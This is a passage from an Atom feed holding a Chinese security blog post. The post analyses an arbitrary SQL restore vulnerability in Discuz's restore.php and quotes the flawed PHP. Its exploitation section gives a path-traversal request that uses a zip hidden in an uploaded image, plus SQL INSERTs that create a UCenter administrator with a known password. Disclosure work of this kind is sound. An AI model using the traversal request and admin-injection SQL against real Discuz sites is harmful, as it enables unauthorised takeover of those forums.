class=&quot;string&quot;&gt;&#39;restore.php?operation=import&amp;amp;datafile_server=&#39;&lt;/span&gt;.$datafile_vol1.&lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;importsubmit=yes&amp;amp;delunzip=yes&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;confirm&#39;&lt;/span&gt;);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;该语句将zip中的.sql文件解压出来。 写到/data目录下。我们可以看到backupdir的值其实是可控的。他是截取datafile_server第9到第14个字符。那么我们传递构造./的方式使路径可控在/data目录下。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;程序走到 118行，将解压出来的文件交给 import 逻辑中。&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//line 92&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt;($sqlquery &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; $sql) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	$sql = syntablestruct(trim($sql), $db-&amp;gt;version() &amp;gt; &lt;span class=&quot;string&quot;&gt;&#39;4.1&#39;&lt;/span&gt;, DBCHARSET);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//die(var_dump($sql));&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($sql != &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    $db-&amp;gt;query($sql, &lt;span class=&quot;string&quot;&gt;&#39;SILENT&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    &lt;span class=&quot;comment&quot;&gt;//die(var_dump($db));&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(($sqlerror = $db-&amp;gt;error()) &amp;amp;&amp;amp; $db-&amp;gt;errno() != &lt;span class=&quot;number&quot;&gt;1062&lt;/span&gt;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		$db-&amp;gt;halt(&lt;span class=&quot;string&quot;&gt;&#39;MySQL Query Error&#39;&lt;/span&gt;, $sql);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里 ，程序执行了从.sql文件中读取出来的SQL语句。&lt;/p&gt;
&lt;h3 id=&quot;0x02-利用&quot;&gt;&lt;a href=&quot;#0x02-利用&quot; class=&quot;headerlink&quot; title=&quot;0x02 利用&quot;&gt;&lt;/a&gt;0x02 利用&lt;/h3&gt;&lt;p&gt;首先我们需要上传一个zip文件，但是有些站长并没有开启上传zip的功能，所以我们可以构造一个带有zip文件的图片，从而达到上传zip的目的。&lt;br&gt;&lt;img src=&quot;http://smilent-typecho.stor.sinaapp.com/650122667.png&quot; alt=&quot;d2.png&quot;&gt;&lt;br&gt;我们上传图片，然后得到路径。然后构造。&lt;code&gt;datafile_server=../././././././././././././././././data/attachment/forum/201510/12/165500vfnjdnqrqapqnqen.jpg&lt;/code&gt;&lt;br&gt;访问&lt;code&gt;http://localhost/utility/restore.php?operation=importzip&amp;amp;datafile_server=../././././././././././././././././data/attachment/forum/201510/12/165500vfnjdnqrqapqnqen.jpg&lt;/code&gt;即可恢复数据。&lt;br&gt;其中可以写入一下两条 来创建一个ucenter的管理员帐户。&lt;br&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;`pre_ucenter_admins`&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;`uid`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`username`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`allowadminsetting`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`allowadminapp`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`allowadminuser`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`allowadminbadword`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`allowadmintag`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`allowadminpm`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`allowadmincredits`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`allowadmindomain`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`allowadmindb`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`allowadminnote`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`allowadmincache`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`allowadminlog`&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;VALUES&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;123456&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;smilent&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;`pre_ucenter_members`&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;`uid`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`username`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`password`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`email`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`myid`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`myidkey`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`regip`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`regdate`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`lastloginip`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`lastlogintime`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`salt`&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;`secques`&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;VALUES&lt;/span&gt; (&lt;span class=&quot;number&quot;&gt;123456&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;smilent&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;e294305468a5531f74613f48fec87f31&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;admin@admin.com&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;hidden&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1444635858&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;2dabff&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;); //pass: admin&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后进入后台 拿到uckey。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h3&gt;&lt;p&gt;restore.php 是discuz官方提供的数据恢复，该工具中存在一个可以恢复任意sql文件的漏洞，从而可以造成插入ucenter管理员帐户，获取uckey，甚至getshell的情况。&lt;br&gt;&lt;img src=&quot;http://smilent-typecho.stor.sinaapp.com/1152864778.png&quot; alt=&quot;d1.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x01-漏洞原理&quot;&gt;&lt;a href=&quot;#0x01-漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞原理&quot;&gt;&lt;/a&gt;0x01 漏洞原理&lt;/h3&gt;&lt;p&gt;漏洞出现在&lt;br&gt;&lt;a href=&quot;http://localhost/utility/restore.php?operation=importzip&amp;amp;datafile_server={file_path}&quot;&gt;http://localhost/utility/restore.php?operation=importzip&amp;amp;datafile_server={file_path}&lt;/a&gt;&lt;br&gt;文件&lt;code&gt;/utility/restore.php&lt;/code&gt; 142 行开始，importzip 逻辑中。&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//line 157&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$backupdir = substr($datafile_server, &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//....&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// line 173 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt;($unzip-&amp;gt;Entries &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; $entry) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&quot;/\.sql$/i&quot;&lt;/span&gt;, $entry-&amp;gt;Name)) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			$fp = fopen(&lt;span class=&quot;string&quot;&gt;&#39;../data/&#39;&lt;/span&gt;.$backupdir.&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;.$entry-&amp;gt;Name, &lt;span class=&quot;string&quot;&gt;&#39;w&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			var_dump($fp);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			fwrite($fp, $entry-&amp;gt;Data);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			fclose($fp);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			$sqlfilecount++;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//....&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//line 118&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;show_msg(&lt;span class=&quot;string&quot;&gt;&#39;database_import_multivol_confirm&#39;&lt;/span&gt;, $siteurl.&lt;span class=&quot;string&quot;&gt;&#39;restore.php?operation=import&amp;amp;datafile_server=&#39;&lt;/span&gt;.$datafile_vol1.&lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;importsubmit=yes&amp;amp;delunzip=yes&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;confirm&#39;&lt;/span&gt;);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;该语句将zip中的.sql文件解压出来。 写到/data目录下。我们可以看到backupdir的值其实是可控的。他是截取datafile_server第9到第14个字符。那么我们传递构造./的方式使路径可控在/data目录下。&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://blog.smilent.me/categories/web/"/>
    
    
      <category term="SQLi" scheme="http://blog.smilent.me/tags/SQLi/"/>
    
  </entry>
  
</feed>
